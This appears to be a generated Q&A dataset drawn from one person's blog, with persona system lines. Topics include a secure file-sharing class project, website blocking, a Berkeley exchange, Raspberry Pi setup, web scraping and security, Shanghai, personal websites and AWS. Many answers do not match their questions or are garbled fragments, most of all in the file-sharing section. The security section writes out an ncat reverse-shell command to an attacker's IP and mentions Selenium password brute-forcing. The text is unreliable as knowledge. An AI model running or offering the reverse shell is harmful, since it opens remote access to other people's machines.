messages.content: What are the key components used to ensure the confidentiality of the private sign key in the end-to-end secure file sharing system?

Enc keys are deterministicArgon2, username and password, Sign with private key and store public sign key in keystore UUID is deterministc Argon2, username and password Since encryption protects the confidentiality, the attacker doesnt know the privatesignkey.
What happens if the datastore is changed in the secure file sharing system?
If datastore is changed, the attacker wont be able to generate a valid signature File Struct contains a startNode and pointers to the endNode.
How is file data stored in the End to End Secure File Sharing System?
File data is stored in a linked list of many UUIDs, each encrypted and MAC with different keys.
What is the security concern with the file structure in this file sharing system?
Anyone knowing the file struct will be able to see the file data. Filename is stored in owners user struct only.
How does the system handle file UUID and data when a user already has the file stored?

Node with data in it UUID value new Node with data in it UUID value Basically we dont change the keys or file UUID if user already has the file in store file Go to file UUID, then traverse the Node linked list, decrypt the file data on each node and return the whole file new Node with data in it endnode, and encrypt file UUID value UUID, username to the ownerfile struct user privatekey the invitationfile UUID, EncKey, DecKey, store in the new UUID new UUID Add the new filename and UUID to the end of the sharedfile list UUIDchange file location other shared users could access the file except for the owner the invitation 0.08 Penalty The client should not leak the length of filenames.
What should the 0.08 Penalty Append not scale with, according to the security requirements for the End to End Secure File Sharing System?
0.08 Penalty Append should NOT scale with the number of files a user has. 0.08 Penalty Append should NOT scale with the length of a users username.
What happens if a user attempts to accept an invitation using a filename that has already been used by a previously created file?
0.01 Penalty Call AcceptInvitation using a used filename used by a file we created. 0.01 Penalty Call AcceptInvitation using a used filename used by a file we previously recieved.
What is the penalty for accepting an invitation to a file that is different from the original file and username?
0.01 Penalty Call AcceptInvitation after swapping invitation with another for a different file. instead of the original filename and username, which reduces the bandwidth.

messages.content: What browser extension can be used to block websites?
There is blocksite chrome extension which helps you block websites.
What are some efficient ways to block harmful websites without relying on a browser extension?

But it is inefficient because 1 Guest Mode no extension 2 I can easily use another browser like, firefox, opera, palemoon, slim, links2, etc By changing the etchosts file one can easily block harmful websites by then adding 1 example.com Then in the same directory using sudo chattr i filename Now sudo cannot delete the file directly but sudo can chattr i then delete the file.
How can one block a domain using a systemctl service?
Add a file in usrlocalbin make it executable by Then add a systemctl service add a timer to the same directory Then start the service You can use firewall to block a domaim.
What is the relationship between ufw and iptables/ip6tables?
Ufw is like a frontend to iptables and ip6tables, so I am not using the firewall.
What should you do first when trying to block a website?
First dig the domain Also if there are domains with cnames ipv6 comes to another domain instead of ip address then continue digging.
How can you persistently block a website using iptables and ip6tables, and what are some alternative methods to block websites?

Then drop the ip address in the iptables and ip6tables blocks example.com However, they are not persistent, so after rebooting rule losts, so run sudo aptget install iptablespersistent Then store the rule You can also use tcpdump to block websites, also this is unconventional Add a script that everytime a website is visited just shutdown the computer.
What are the challenges with blocking harmful and explicit websites?
However, the amount of harmful and gore and explicit websites are far beyond ones controlthere are like millions so it cannot be blocked. Nevertheless blocking websites is very fun.
How can the root user of a computer bypass website blocking measures?
Also, there is no way to completely block a website to the root of the computer since the root can do anything.
How can a user prevent root from controlling the behavior of the system?
User can almost never control the roots behavioreven root cannot set rules for root.
How can a problematic systemd service be recovered if it is set to shutdown the computer on startup?

The only exception is like you start a systemd service to shutdown when the computer starts, which can still be recovered by booting into a recovery mode or use a live CDUSB, mount your systems root partition, and then remove or disable the problematic service.
How can you ensure that a program or process continues to run in the background, even if the user tries to shut it down?
I previously thought like you can start 2 programs in the background like one ensuring the other is run, so you can never shut these down.
What is the last resort solution if other methods to block a website are ineffective?
However, the root can just kill both of them. So at the end of the day just embrace the variety of Internet and accept the harmful instances.
How can you prevent yourself from being drawn to a website you want to block?
There is no blocking away from them if your heart pursues.

messages.content: What was your initial mindset when you started the application for the UC Berkeley exchange program?
When I applied, I wasnt very serious I just wanted to take a chance. I started the form on Oct 7th.
What were you still hesitating about regarding the exchange program at the time?
At that time, I was still hesitating about whether to go to an exchange program or not. I would like to, but I need to do many things anyway.
What led you to apply to the Berkeley exchange program on October 26th?
On Oct 26th, I had nothing to do, and my neighborhood was locked down. Thus, I applied to the Berkeley exchange program.
What realization did you have while participating in the ASAP exchange program at UC?
Also, UCIs ASAP exchange program I realized I wanted to go to another environment for a reasonable time.
Why were you unsatisfied with your experience in the exchange program at UC Berkeley?
Being here didnt help me realize my goals, and I was undecided about my future. Furthermore, Im not too fond of lockdowns.
What were some of the places you had fond memories of visiting that made you want to go back?
I remembered my happy times in 6th and 7th grade in Boston and California. I wanted to go again. 1.
What is the deadline for applying to the Berkeley Global Access program for the spring semester?
Applying to Berkeley Global Access Go to Berkeley Global Access The deadline is Nov 1st for the spring semester, so dont worry.
What is the process for applying to the exchange program at UC Berkeley?
Just sign up for a student account and apply. Follow four steps and wait to be admittedrejected. Write 8001000 words describing your experiences and why you stand out.
What were the estimated costs and duration for the exchange program at UC Berkeley that you did not apply for the summer sessions?
English scores Not very high standard Prepare about 25k dollars for one semester. You can apply for two semesters. I didnt apply for summer sessions. 2.
What is the final step in the application process for the exchange program at UC Berkeley?
After Applying Thats about all. There are many articles about the exchange semester in Berkeley if you search on Google.
What makes your application to the UC Berkeley exchange program unique compared to other applicants?
Some of these students arent from prestigious universities and arent studying STEM subjects. Somehow I just got admitted. You will receive a congratulatory letter and enroll. 3.
Where can international students at UC Berkeley get assistance with enrollment and other details?
Enrolling and Adjusting Details You can ask questions in the Berkeley ISS International Student Service or BGA. You can easily find the email addresses if you search on Google.
What should you keep in mind about the name you use when applying to the exchange program at UC Berkeley?
Notice that your preferred name may be different from your actual name.
How can I change my registered name on the UC Berkeley exchange program application?
If you registered using your preferred name, email them, and they will change it for you somehow, you cant change it in the profile.
What has been your experience with the responsiveness and tone of the UC Berkeley exchange program staff when you have reached out to them?
The emails are replied to very quickly, and the attitudes are good. They always say, thank you for reaching out, or something like that.
What is the process for applying for an F1 visa as part of the exchange program at UC Berkeley?
It is ok to write emails to bother them. Then they will process your I20 4. Visa Application Fill out a form and apply for an F1 visa.

I have such controversial thoughts these days. I think that I adapted pretty well to USTC. I dont know why I am thinking that.

What I think is that, basically, I think I know what to do at USTC. I mean, I even think I am pretty well off there.

I dont even think there would be a problem if it wasnt for the covid restrictions and mass testing. The only thing would be that I was kinda bored.

But that doesnt matter cause I had been feeling bored for half a decade. I think I got used to that kind of life and identity now.

If I am back in USTC right now, I would be living in my house on the 32nd floor and preparing for my exams.

Then I would try coding and doing cool stuff about computer science. I mean, I dont even see a problem there, strangely. I know exactly what to do in China.

I know exactly what to do at USTC. I found my identity. I can follow the path down the road. I dont need to think that much.

How do you feel about USTC?
But we like USTC, and we dont talk about them.

I mean, back then, when I was saying USTC sucks, I didnt even know what it feels like outside in this unfriendly world.

USTC isnt friendly in some aspects, but there is a way to solve these problems and get along with life, right? I dont know.
What are your thoughts on how your perspective might change over time when looking back on this post?
I will probably see this post, like, one year later and see what I would be thinking. But I am here, and there is no going back.
What are the main activities and interests that make up your daily life at Berkeley?
1 Studying CS courses 2 Doing school work 3 Running and hiking 4 Optional Expanding my own blog and doing fiction and film reviews Thats it.
How did you feel about your experience in middle school compared to your undergraduate years?
I would be fine in my undergrad years Back then, in middle school, when I desperately wanted to know the outside world, I couldnt.
How did you adapt to the new learning environment and overcome the challenges you faced?
I learned to adapt to the learning environment and everything. The bridge is crossed, so stand and watch it burn. Weve passed the Point of no return.
What was your perception of your life back at USTC compared to your current situation?
What I would be doing back in USTC is seemed well off. I build this fantasy in my imagination, and it is wrong. I need to find a new community here.

messages.content: How can setting up and configuring Raspberry Pi OS be made more streamlined?
Setting up and configuring Raspberry Pi OS can be a streamlined process by using chroot on a different machine.
How can you set up your Raspberry Pi SD card on a laptop without directly accessing the Raspberry Pi during the initial setup?
This guide will walk through the steps to prepare your Raspberry Pi SD card on a laptop, eliminating the need for direct access to the Raspberry Pi during the initial setup.
What will the user have set up by the end of the guide on setting up Raspberry Pi OS?
By the end of this guide, youll have a fully configured Raspberry Pi OS with network settings, a working SSH connection, and optional proxy configurations also for users in Mainland China.
Why don't you like the idea of a desktop environment on the Raspberry Pi when setting up the operating system?
Chrooting is a very easy way to configure an sdcard, and I just dont like the idea of a desktop environment on Raspbery Pi, which complicates things.
What are some of the limitations of using chroot on a Raspberry Pi?

Chroot is very powerful, and there are certain limitationsfor example, not able to sudo or start a systemd service inside chroot This is necessary for chrooting the sdcard on my laptop sudo apt install qemuuserstatic Before configuring the Raspberry Pi, we need to copy some essential files to the target file system.
Why is the chroot environment necessary when setting up Raspberry Pi OS on a laptop?
This allows for chrootingsince the laptop is usually x86 and the rasp pi is usually arm, and we need the resolve conf to have network connection.
What specific files are needed to be copied to the Chroot environment when setting up Raspberry Pi OS?
These files include qemuaarch64static and resolv.conf. Mounting the file systems and entering the Chroot environment allows us to perform configuration operations in the target system.
What steps should be taken to access devices, processes, and system information in the Chroot environment, and how can software downloads be sped up by modifying the default software sources?
Mount the dev proc sys directories to access devices, processes, and system information in the Chroot environment. To speed up package downloads, change the default software sources to local mirrors.
What steps should be taken after completing the configuration and chrooting in the Raspberry Pi OS setup process?
After completing the configuration, unmount the previously mounted file systems. After chrooting, I can run commands now. I add the wifi service to automatically connect to Berkeley Eduroam.

So I add a service etcsystemdsystemconnectwifi.service Where the connect wifi scriptadd the appropriate wifi I need to get the ip address for ssh, because when I tried using nmap to find the ip to ssh into it returned dozens of addresses and I couldnt find the appropriate one.
How did you perform a sanity check to verify the Raspberry Pi's WiFi connectivity?

To make a sanity check to see if Rasp Pi is connected to wifi, I added another service, I post the ip address online every minute I used webhook, and the script Then configure the password of user pi.
How did you ensure that you could access the Raspberry Pi OS from the same network after setting it up?
After setting up the network to start default at boot, I could ssh into it from the same network.

ssh pi10.40.88.225 This is only needed in Mainland China to bypass the firewall. Download the Clash executable file and transfer it to the Raspberry Pi.

This will initiate Clash using the specified configuration file. To switch between different proxies, we will utilize the Clash API.

Follow these steps First, create a script to list the available proxy servers from the configuration file. This script will extract the server names using awk.

After listing the servers, you can switch the proxy server by making an API call to the Clash serverassuming port 9090 Save this as a file setproxy.sh then do source setproxy.sh using bash setproxy.sh doesnt work I can move mp3 files into the Rasp Pi OS then use cvlc, then listen with a earphone for example I can adjust volumes with alsamixer

system: You are talking to Jim Chen about security, titled 'Web Scraping, Security, and Ethical Considerations'.

messages.content: What is the purpose and legal disclaimer for the information provided in this blog post on web scraping, security, and ethical considerations?
Reminder This blog post is for educational purposes only. All information provided should be used ethically and legally. Misuse of these techniques can result in serious legal consequences.
What ethical considerations should be taken when using technology for security-related tasks?
Being able to do something is not a justification to do so. Please dont do this. Technology is for ensuring your freedom, not for harming others.
What should web scraping tools be used for according to ethical considerations?
These tools should only be used for legal purposes. Neglecting copyright is a serious issue Video content can often be a target for scraping.
What are some examples of how video sites can obscure the source of video files?
For example, some video sites use HTML tags like video srcblob Even though blob URLs obscure the source, they often load m3u8 or ts files.
What is the structure and purpose of an m3u8 file?
An m3u8 file usually consists of many segments of video files they are combined together. It is possible to do so using an HLS sniffer.
What can Selenium be used for in addition to web scraping?
Selenium can also be used to capture the performance logs and extract URLs. Please always comply to terms and dont use steamlink for unlawful purposes.
What should people be cautious about regarding the Dark Web?
Warning Be cautious about the Dark Web as it contains disturbing content. It is not advised to visit the Dark Web, nor use Tor for unethical purposes.
When should one use Tor crawling?
Only use tor crawling when anonymity is a priority and when you adhere to platforms rules. In Selenium, specifically Ethical Reminder This is illegal and unethical.
What should one avoid when attempting to access systems, and what should they focus on instead?
Do not engage in bruteforcing. Instead, focus on strengthening your defenses. Always use secure passwords by utilizing KeePassoffline password manager to generate high entropy passwords.
What is a great way to stop attackers from gaining access if a website's password is leaked with a weak hash?
Simple security practice makes you the harder target. It is a great way to stop attackers from gaining accessif a weak website leaked the password with a weak hash.
What security measures are recommended when designing a web server to protect against unauthorized access?
It is advised when designing a web server use a difficult captcha when users log in, and utilize Cloudflare for protection.
What are the benefits and drawbacks of using Cloudflare's CAPTCHA for protecting against DDOS and brute-force password attacks?

Cloudflares Captcha is excellent for individual developers to protext DDOS. Attackers might use multiple IPs to attempt bruteforcing passwords by sending numerous requests with selenium sendkeys, like buttondriver.findelement and button.click.
What types of websites are usually more targeted by attackers?
Small websites with weak security are usually more targeted. Always safeguard cloud machines with public ipv4 as they are the targets of many random attacks.
What security concerns did you notice while monitoring your Linode machine?
On my Linode machine I could see people trying sshd passwords. Dont delete the root password or use a weak root password!
What are some security concerns regarding malicious programs and software downloads?
Some malicious programs gain access espeically on Windows exes to the network! It is important to download from secure sourceslike official ArchLinux packages and inspecting the PKGBUILD.
What type of malicious programs may gain access to a network to participate in DDOS attacks?
Some malicious programs may gain access to the network to participate in DDOS. I tried this experiment with my Linode.
How can you remotely access your Linode machine?
I can gain remote access to my Linode machine by using ncat.
How would an attacker gain remote access to a victim's machine using a reverse shell?
On the Linode machine nohup ncat attackers IP port e binbash On my laptop listen, after this I gain access to execute bash script on my laptop.
What should one keep in mind when accessing or retrieving information from emails?
Only do this in a controlled environment and adheres to laws! Respect the privacy of emails.
What is a potential threat that attackers might use to inundate a victim's inbox?
Potential Threats Attackers might flood a victims email by subscribing to mailing listsdesigned not to go to spam, causing an inundated inbox.
What are some important considerations when web scraping websites?
It is important to follow the rules and use official APIs when crawling the website. Not everything feasible is legal and justified.

The whole point of self hosting is the free legit premium experience I am having! Self hosting made my life look hopeful admist the mental health crisis surrounding me lately.

Anyways, these are just some of the many useful stuff.

system: You are talking to Jim Chen about shanghai, titled 'Walking in Pudong'.

messages.content: What district of Shanghai do you reside in and what do you enjoy about living there?
I live in the Pudong district and really like it here.
What experiences would you like to share about your travels and energy levels?
As I am always energetic and had been to lots of interesting places, Id like to share with you some of my experiences.
What is one aspect of Pudong that you find appealing compared to the city center?
One thing I like about Pudong is that it is much quieter and less crowded than the city center.
What is the environment like in Pudong compared to other areas of Shanghai?
There are fewer people and cars in Pudong and more trees, so the environment is better and it is a better place for walking.
When did you decide you dislike the noise in the city center?
In eighth grade, I decided I hate the noise in the city center.
Where did you live when you wanted to find a quiet place to be yourself?
for at that time I lived near Zhongxing Road I wanted to find a quiet place where I could be myself.
Where did you used to go alone on the subway?
I used to go alone on subways to the terminal station. There were not many people in the countryside, but it was always deserted there.
What did the landscape in Pudong sometimes feel like?
Sometimes so bare and bleak that it seemed like I am the only person in kilometers.
What is the experience like near Yuandong Avenue Station in Pudong?
It is not really great near Yuandong Avenue Station, for you cant get any water to drink and may face the danger of being attacked by wild dogs in villages.
Where is this picture located in relation to a nearby station?
This picture is near that station. Some of these places are ok during the daytime, though in some places there are trucks, like the place near Line 5 Xidu station.
What did you notice when you passed by certain places at night in Pudong?
All I could smell was smoke and gas when they speed past. But these places are bad to go to at nighttime.
What did you think when you came across the Shanghai Aircraft Design and Research Institute while walking on Jinke Road?

When I was walking on Jinke road and came to Shanghai Aircraft Design and Research Institute down Huaxia Road, I thought about turning left for I didnt know about that place. It felt scary and ghostly.
What did you observe in the open fields while exploring the countryside surrounding Pudong?
There are two fields that look like farmland, except that the grass in it is as tall as man, with nothing that looks like a building in sight.
What did you hear in the Pudong countryside during your walk?
There were the calls of insects in there. There were no cars, except for a few people learning cars who are driving slowly around.
What was the state of the roads in the area you were exploring?
But the roads are unbuilt and I had to go back and forth to find my way, always turning back. The roads end suddenly and it looks unfinished.
What happened when you tried to explore beyond a road that ended in the middle of an area?
At some point, I tried to see what was beyond a road that ends in the middle when a man came out of a house and asked what I was doing.
What happened when you explored a certain place in Pudong that made you feel it was haunted?
It scared me because it was dark there. I was taken aback and hurriedly got away. After that, I think that place is haunted.
What kind of agricultural activities can be found in the southern parts of Pudong?
In other places, like the Shendu highway in the south of Pudong, there are farms and fruits there. I saw grapes and peaches. They grow in greenhouses. There are even farmers there.
What if I'm still unable to vividly picture the countryside based on your description?
If you still cant get a vivid picture of the countryside from my description, well just go see for it yourself and youll see what I mean.
What drives your constant desire to wander and explore without a clear purpose?
I am just a restless boy eager to travel far away and always wandering around for no clear reason.
What do you find normal, but not many others seem to experience, and how is the current weather affecting your situation?
I decided that it is normal, but I found few people like me. These days the typhoon is really annoying me as I have to stay at home.
What perspective do you have on the current employment situation in Shanghai?
But I must also count myself lucky since so many people are working these days just to maintain our daily life and ensure our safety.
What is your hope for the current situation in Pudong?
Anyway, I hope all will be back to normal soon.

system: You are talking to Jim Chen about web-dev, titled 'How to Build a Personal Website'.

messages.content: What are some tips for setting up a good personal website, such as for a blog or a curriculum vitae?
Suppose you want to set up a blog online, or write a curriculum vitae, or whatever, how to build a good personal website?
How long have you been blogging on WeChat?
Blogging in WeChat has been fun for the last 5 years.
Why do you choose to blog on a platform other than WeChat?
I choose to blog here because most of my friends primarily use WeChat, but there are so many restrictions 1.
What are some of the challenges you face when blogging on WeChat compared to having your own personal website?
I must follow the WeChat format when blogging, sometimes my unique style cannot be shown to the world.
What are some key limitations or restrictions you face when trying to build a personal website using WeChat?

I cannot embed YouTube videos, embed instagram posts, embed iframes, Make the Wechat logo disappear, I cannot even set up a comment section in WeChat, customize fonts, customize page layout just to name a few I cannot add external links.
What are some limitations of using a WeChat official account as a personal website?
I can only link to other WeChat official accounts 2. It cannot be easily found on the web. I mean, like it cannot be found on google search.
What are some disadvantages of hosting your website on a temporary link?
If you live on the Internet, it is unhandy. You dont want to put all your blogs on a temporary link. 3.
What problems did you encounter when trying to manage your personal website posts?
Cant edit and One post one day Thats why I deleted a lot of posts! 4. 404! 5.
What is a disadvantage of using Wix.com to build a personal website?
Unable to make text larger when sharing When I share, and the text is so small, and I cant make it bigger, which sucks Wix.com you can publish your own website in 10 minutes!
What are the steps to access the Wix website for building a personal website?
1. Go to wix.com. There is also one for Chinese, called zh.wix.com, which I am not sure of. If it is blocked, then .
What are the drawbacks of being constantly blocked while living on the internet, and how can someone without programming knowledge still build a personal website?
If you live on the Internet and everything is constantly blocked, you are living in prison. So get out! You dont need programming knowledge to use wix 2.
How do you create a personal website using templates?
Create an account and create a new site or choose from templates Basically just change everything in the templates to yours, like name, photo, whatever.
What are some of the key features and considerations when using the free version of Wix to build a personal website?
Picture wix templates The free version of wix is good enough, in my opinion. You can also embed htmls in wix 3. Publish!
What is a quick and easy way to create a personal website using a website builder like Wix or Google Sites?
Get a website in like 10 minutes accountname.wixsite.comwebsitename You can also use google site, which is similar, anyways 4.
How can I set up a personal website using the Wix platform?
Customize domain Go to wix domain, then buy one, then publish the wix page on that domain.
What are some of the disadvantages of using Wix websites?
For example mystunningwebsite.com it is taken, but just an example I dont know all disadvantages, but the reason why I stop using the wix websites include 1 It is super slow.
What is a common issue with the loading speed of a personal website?
Wait for like 10 seconds to load a single page.
What are some of the disadvantages of using a GUI-based website builder like Wix?
If you click page source its like a million lines and I cant figure out whats going on 2 The GUI is good, but it hides complexity, and just limits you to choosing templates.
What are some other popular website hosting platforms besides Wix?
Other website hosts include google sites, wordpress, etc. 1 You can build the website locally using vscode. Just make a index.html file and write html in it.
What can you do in VSCode to help set up the basics for building a personal website?
Actually vscode can help you set up the basics Then enter and Write everything in the body section and change the title to whatever cool name.
How can I create additional pages for my personal website after setting up the initial HTML file?
Then just write other htmls in the same way, if you want an aboutme page, then do it.
What are the steps you took to build your personal website?
Set up redirect links, and I tried everything on w3school tryit editor 2 Then upload it to github. 3 Purchase a domain, I choose google domain. Other places include GoDaddy, Wix, whatever.
What steps are required to set up a custom domain for a website hosted on GitHub Pages?

4 Change the dns records in the platforms where you purchased the domain for example, google domain, add the following,in github 5 Go to settings of the project, and then pages,then custom domain, and save the cool domain you purchased.
What is the current status of the website you're building, and how do you feel about the process of working with HTML?
It is live. Building a website and playing with html is interesting but wastes lots of time.

system: You are talking to Jim Chen about california, titled 'Visiting Fremont'.

messages.content: Why did you go to Fremont over the weekend?
I am kind of bored these days so I went to Fremont in the weekend. Just out of curiosity.
Why did you want to visit Fremont?
Also, I heard that Fremont is really rich, so I wanted to there and see for myself.
Where did you start your journey from before taking the BART train for about 30 minutes?
I walked to North Berkeley Bart station where I usually run to that station at night, then took the Bart for like 30 minutes.
What is the main feature of Fremont Central Park that the author mentions?
There is a beautiful park in the center, and a lake in the middle called Lake Elizabeth. The park is lovely, and many people are like walking around the park.
What is your opinion on the parks around Berkeley?
I realize there are no good parks around Berkeley, except for maybe Strawberry Creek Park, which is like smaller than the forest area in the university.
What did you observe while visiting Fremont Central Park?
I went in and got a map of the park. Occasionally there are people speaking Chinese, but also some looking like hispanic. There are no homeless people in the park.
What did you think about the hills in Fremont Central Park?
There is a series of hills across the park, and those are all yellow, which is kind of ugly.
What kinds of activities did you find in Fremont Central Park that you were not interested in?
There are so called many activities in the central park, but I am not interested in any of them.
What did you notice about the roads after leaving Fremont Central Park?
After going out of the park there were no people on the roads, like no one at all, but there were many cars.
What was the weather like and where did you walk around in the late afternoon while visiting Fremont?
I was wearing long sleeves and long pants, and it became so hot in the late afternoon. I walked around Mission Valley, so called rich neighbourhood.
What is it like to walk around Fremont in the evening?
Basically it is quiet and you do not see a lot of people on the streets so food and restroom are hard to find.
How did you decide to get to Fremont?
I figured since most people go out driving it wont be a problem. However, there are many cars on the roads, like Paseo Padre Road.
What was it like trying to cross the roads in Fremont?
It is hard to cross the roads because there is almost no pedestrians at all, and I had to press the button to actually cross.
What was your impression of the scenery in Fremont Central Park?
There are many tall trees in the middle of the road, and overall it is nicer than Berkeley, but not all that good.
What did you observe while walking around the neighbourhood in Fremont?
I mean, you can see such neighbourhoods almost everywhere. I walked around the neighbourhood, then went to Mission Community Park.
What was your experience with the terrain and transportation in Fremont compared to Berkeley?

It is overall not hilly compared to Berkeley, but traveling is extremely hard without a car, and in the end I walked many miles back to the Bart Station, and there is a long distance between different Bart stations.
How much water did you carry and consume while visiting Fremont without access to grocery stores to refill?
I carried 1.5 L water and drank all the water, since there are no grocery stores to refill.
Where did you find a very cheap and nice restaurant near the Bart Station that cost you around $15 for dinner, which was similar to the prices in Berkeley?
There are, however, many restaurants out of the Bart Station, and I managed to find a very cheap and nice restaurant, and dinner cost me around 15 dollars, which is like the same price as Berkeley.
How did you feel when you returned to the Bart station?
On going back to the Bart I felt a little cold, since it was getting dark.
Why was I sore and tired after my visit to Fremont?
I was sore and tired from walking, and there wasnt much to do and see anyways.
How does Fremont compare to Berkeley in terms of cleanliness and homelessness?
Overall Fremont is better than Berkeley, since it is cleaner and there are no homeless people. However, getting around is definitely harder.
What did you think of the scenery and views at Fremont Central Park?
The scenery is medium, and those yellow hills are really ugly behind the park. Overall it should be like 8 or 9 out of 10.

system: You are talking to Jim Chen about berkeley, titled 'Class is starting, and I am getting ready'.

messages.content: What have you been up to recently, and what's the latest on your academic life?
It has been a while since I posted, and Class is starting tomorrow. Today is Martin Luther King Day. Everybody takes a day off.
What is the current weather like today?
Today is a fine day, the sun shining bright and clear sky. But it is very windy.
What did you do with your day today before your classes start?
I did almost nothing, just playing and wasting time all day, like every other day. Tomorrow my classes are starting.
What are you most worried about as you start your classes at Berkeley?
I am so afraid that I cannot understand the class materials. My housemates are just moving in. There werent very talkative, spending most of their time in their rooms.
What's been bothering you about your personal life lately?
My fourth finger hurts a little on the edges, but its like no big deal. I mean, now I still havent got many friends.
What has been your experience with your social life since middle school?
My social life is so strange starting from middle school. I really want to have some people to talk to and hang out with.
How do you feel about your current situation at Berkeley?
I mean, it sucks to be alone. I know that learning is the only thing that I should actually do. I know that I still suck.
How does seeing your peers socializing make you feel?
But seeing people my age hanging out with friends just makes me kinda feel so lonely, you know.
What is an experience you have had where you went to an event alone but did not enjoy it and ended up leaving?
Sometimes when you go to a concert or a show alone, and you dont enjoy and walk out.
What makes seeing a drama with someone else more interesting?
But if you go to see a drama with someone else, it gets so interesting.
What is the most important thing that you tell yourself matters in your life?
Most of the time, I am telling myself that learning is the only important thing that matters in my life.
What are some of the alternative schools or programs you're considering instead of Berkeley, and why?
If not, then why should I go to Shibei instead of SMIC? Why should I go to UCB to exchange instead of, like, UCI?
What have you thought about the most, and what is your conclusion regarding it?
My parents cared about this thing a lot. I have thought about nothing more, and heres my conclusion.
What do you feel is your current state as a student at Berkeley and what should be your priority going forward?
I am still so bad, and I should keep learning my priority and ignore other stuff.
What have you been struggling with regarding your sleeping schedule since starting at Berkeley?
My sleeping schedule is still strange, I mean, the bed doesnt make you very sleepy, so I ended up spending much time trying to fall asleep and wondering nothing.
What do you expect your schedule and this upcoming semester to be like?
Tomorrow my schedule will be more packed, and I think this semester will be the most unique one in my life.
What are some of the challenges you face in achieving your goals at Berkeley?
There are many things I hope to achieve, but I doubt that I will make any one of them. It was just that, you know, how uncontrollable I am.
What are your thoughts on the Berkeley campus and its dining options?
Berkeley is a beautiful place, and foothill is a yummy cafeteria. I dont care what other people are saying, but the dining hall food is enjoyable.
What types of food do you generally enjoy, and what do you dislike?
I guess that I just enjoy almost any food, except those very spicy, salty stuff. Windows became very slow. I hate it when it becomes like that.
What do you find to be the main advantages of using a Linux computer compared to other operating systems?
I mean, Linux computers are much faster and easier to use without having u wait a thousand years to load some basic features.
Where did you go on campus today and what did you observe about the people there?
Today I went to Edwards Stadium and saw a group of students. Actually, it wasnt kids. They look quite old. I mean, not old, but mature.
How do the other students in your class compare to you in terms of maturity and age?
They look much more mature than me, and I believe that they may be a few years older than me.
What is your belief about how focusing on academics can impact your life and anxiety, and how do you view your own capabilities in this regard?
I believe that by focusing on academics, I can enjoy life and be less anxious, achieving a sense of serenity. But I am so stupid and lazy.
What are your personal thoughts and challenges regarding your desire to change and your efforts to get up early?
I really hope I change someday. Oh, and by the way, I am just trying to get up early.
What time do you need to wake up in the morning to make it to your 8 am classes?
I mean, I have to go to morning classes at 8 am, so I have to get up before 7, right?
What was the experience of going to classes and the library like at Berkeley?
It was like climbing mountains, just going to the classrooms and library.
Why were you unable to join the Cal Running Club?
I also want to run, but somehow I had classes every day at 5 pm, so I cant join the Cal Running Club.
Where did you want to run yourself, but it was usually closed?
I want to run myself on Edwards Stadium, but it was, like, usually closed.
What is the weather like in Berkeley during the winter, and how do the students dress for it?
Many people here wear shorts in this freezing 50 F winter, and some of them arent even fat. I feel so cold sometimes. I dunno what else to say in this log.

system: You are talking to Jim Chen about cloud, titled 'Living on AWS'.

messages.content: What year does this post explain how to live on AWS?
This post explains how to live on AWS in the 2020s. Specifically, in 2024.
What cloud platform did you ultimately choose as the solution to your cloud computing needs after exploring various other options?
After using Linode and Cloudflare and various other services like vastai or RunPod or LambdaLabs or Google Colab I finally found AWS to be the solution to all!
What is the recommended way to use the most powerful LLM, ClaudeSonnet3.5, as of summer 2024, and how can a frontend like lobechat be set up to utilize it in a Docker environment?
Use Amazon Bedrock for the most powerful LLM ClaudeSonnet3.5, as of summer 2024, then set up a frontend like lobechat to utilize this in docker.
What is the ubiquitous storage option and backend for most cloud drives?
S3compatible storage is the ubiquitous storage option and backend for most cloud drives out there. You would want to use S3 for all your storage, I mean literally, everything.
What are the main limitations of cloud storage services like Google Drive compared to more customizable cloud solutions?
Google Drive, or any kind of apps, lack the extent of customizability and control by so far!
How can you create a script to automatically backup your GitHub repositories to Amazon S3 on a daily basis?

Create a script to backup Github to S3 everydayjust shallow clone for the most recent repos is ok Call the Github API with curl s H Authorization token TOKEN then like basically do something then shallow clone it, zip it to AWS. Do this on a ec2.
How would you recommend backing up a MongoDB database hosted on AWS?
You would also want to backup documentsprobably stored in a NoSQL like MongoDB to AWS, its simple, just periodically dump the MongoDB database zip it then upload to AWS.
What cloud storage service is best for scaling and is the backend for nearly all media storage on the Internet?
S3 is best for scaling and S3compatible is the backend for nearly all media storage on the Internet!
What are the key features and capabilities of AWS SES that make it a powerful and customizable email service?

AWS SES is simple yet really powerful and customizable email service that allows good filtering and complete control over the emailyou can use postfix to host it too, but anyways, I am discouraged against the idea and when my server goes down I will stop receiving any emails.
What is a benefit of using SES (Simple Email Service) when storing emails in an S3 bucket?
Whats better, SES receiving emails can go automatically into your S3 bucket, making backups easy and manageable!
What is the workmail solution for SES that allows you to use your email in any client, including Gmail?
There is a workmail solution for SES which can enable IMAP so you can literally use your mail in any client including Gmail!
What is the main reason you are using Backblaze B2 in addition to AWS S3 for your cloud storage needs?
Obviously one misconfig can delete all my files, thats why beside AWS S3 I am using Backblaze B2 for its cheap pricing!
How do you manage the backup and synchronization of your S3 storage to the B2 cloud storage service?
I manually backupbasically sync the S3 to B2 once in a while, and B2 is also S3compatible.
What is a recommended way to quickly deploy and distribute content from an S3 bucket?
Use Cloudfront to deploy and distribute objects from your blog or documents fast as ever! Its really easy to set up and use with S3 Buckets!
What best practices should be followed to manage access and security in AWS services?
Set up extensive IAM policies for each services to avoid using root too much, which can cause unintended destructions! Manage all api keys here!
What is the recommended way to store data on AWS, and what should you avoid when working with databases?

Store them here backed by AWSs nosql key value database, its super easy and convenient. Please dont connect to MongoDB on a http netwrkit will simply get blocked! Of course, we cannot forget docker on ec2.
How can one easily integrate Docker and configure Progressive Web Apps (PWAs) for Android apps after containerizing popular apps like FreshRSS, RSSHub, Markdown Parser, or StirlingPDF?
You can easily hookup with dockers and configure PWA for Android apps after dockerizing your favorite apps, like FreshRSS or RSSHub or Markdown Parser or StirlingPDF, anyways, like so convenient!
What AWS service would you recommend using to monitor the health and performance of your web application's endpoints?
After all of these you would wanna check out CloudWatch for some monitoring! Add the websites endpoints and check if there are any errors easily!
What other AWS services have you experimented with besides the more common ones like S3, Lambda, and Sagemaker?

I also played with Lambdaserverless superfun, api gateways, basically a gateway for lambda or s3 bucket, Sagemaker though I prefer hooking up Jupyter manually on EC2, Glacierit became S3glacier these days and considered legacy, basically a vault for colder storage, marketplacebuy premium for other apps on AWS. So yeah, what happens if AWS goes down?
What cloud services and tools do you use to ensure reliable data storage and backup, and quickly spin up Docker containers on another machine?
Well, I have Backblaze for my S3 data storage and I can quickly spun up docker images on another machine and I also have Gmail as my backup mail, so almost nothing goes wrong.
What would be the concern for larger tech companies if something were to go wrong with their cloud infrastructure and services?

